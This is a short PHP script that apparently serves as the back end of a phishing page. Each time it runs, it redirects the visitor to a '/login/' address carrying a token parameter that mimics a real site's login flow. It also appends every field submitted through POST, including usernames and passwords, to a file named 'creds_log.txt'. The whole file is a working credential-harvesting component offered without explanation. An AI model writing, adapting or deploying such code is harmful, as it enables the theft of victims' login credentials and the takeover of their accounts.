<?php
  header ('Location: /login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjY3OTQzNTIxLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D');
  $handle = fopen("creds_log.txt", "a");
  foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
  }
  fwrite($handle, "\r\n\n\n\n");
  fclose($handle);
  exit;
?>